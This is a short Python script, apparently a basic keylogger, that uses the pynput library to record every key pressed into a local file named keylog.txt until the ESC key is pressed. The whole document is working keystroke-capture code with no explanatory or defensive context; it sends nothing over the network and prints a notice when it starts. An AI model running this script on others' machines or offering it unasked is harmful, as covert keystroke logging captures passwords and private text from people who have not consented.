from pynput import keyboard

# File where keys will be saved
log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(key.char)
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(" [" + str(key) + "] ")

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop keylogger when ESC is pressed

print("Keylogger started... Press ESC to stop.")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()